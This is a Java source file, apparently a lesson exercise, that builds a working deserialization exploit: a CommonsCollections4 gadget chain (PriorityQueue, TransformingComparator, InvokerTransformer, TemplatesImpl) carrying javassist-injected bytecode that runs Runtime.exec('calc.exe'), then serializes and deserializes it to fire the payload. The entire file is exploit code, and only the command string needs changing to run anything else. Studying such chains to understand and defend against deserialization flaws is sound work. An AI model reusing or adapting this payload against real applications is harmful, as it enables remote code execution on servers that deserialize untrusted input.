package edu.demo.lesson3;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import edu.demo.lesson2.MyTemplate;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class Payload {
    public static void main(String[] args) throws Exception{
        //get TemplateImplChain
        TemplatesImpl templates = (TemplatesImpl) Payload.makeTemp();
        //make invoker and set its iMethodName to be newTransformer
        InvokerTransformer invoker = new InvokerTransformer("newTransformer",
                new Class[0], new Object[0]);
        //make a comparator and set its this.transformer to be invoker
        TransformingComparator comparator = new TransformingComparator(invoker);
        //make PriorityQueueChain and set its comparator
        PriorityQueue priorityQueue = new PriorityQueue(1,comparator);//initialxxx must >= 1
        //set queue[0] to be TemplateImplChain && size==2
        Class clz = priorityQueue.getClass();
        Field field = clz.getDeclaredField("queue");
        field.setAccessible(true);
        field.set(priorityQueue, new Object[]{templates,"foobar"});
        field = clz.getDeclaredField("size");//set the size to be 2,after the new PriorityQueue the size is still 0
        field.setAccessible(true);
        field.set(priorityQueue, 2);
        //test
        testSerialize(priorityQueue);
    }

    public static Object makeTemp() throws Exception{
        //make bytecode
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get(MyTemplate.class.getName());
        String cmd = "Runtime.getRuntime().exec(\"calc.exe\");";
        ctClass.makeClassInitializer().insertBefore(cmd);
        ctClass.setName("NormalClass");
        byte[] byteCode =  ctClass.toBytecode();
        //make TemplateImplChain
        TemplatesImpl templates = new TemplatesImpl();
        Class clz = templates.getClass();
        Field field1 = clz.getDeclaredField("_name");
        field1.setAccessible(true);
        field1.set(templates, "foo");
        //set the _bytecodes[][]  for templates
        Field field2 = clz.getDeclaredField("_bytecodes");
        field2.setAccessible(true);
        field2.set(templates,new byte[][]{byteCode});
        //set the _tfactory  for templates
        Field field3 = clz.getDeclaredField("_tfactory");
        field3.setAccessible(true);
        field3.set(templates, Class.forName(
                "com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl").newInstance());
        return templates;
    }

    public static void testSerialize(Object payload) throws Exception{
        //序列化
        FileOutputStream file = new FileOutputStream("abcdefu.bin");//why is this song everywhere :3
        ObjectOutputStream se = new ObjectOutputStream(file);
        se.writeObject(payload);
        se.close();
        //反序列化
        FileInputStream file1 = new FileInputStream("abcdefu.bin");
        ObjectInputStream unse = new ObjectInputStream(file1);
        unse.readObject();
        unse.close();
    }
}
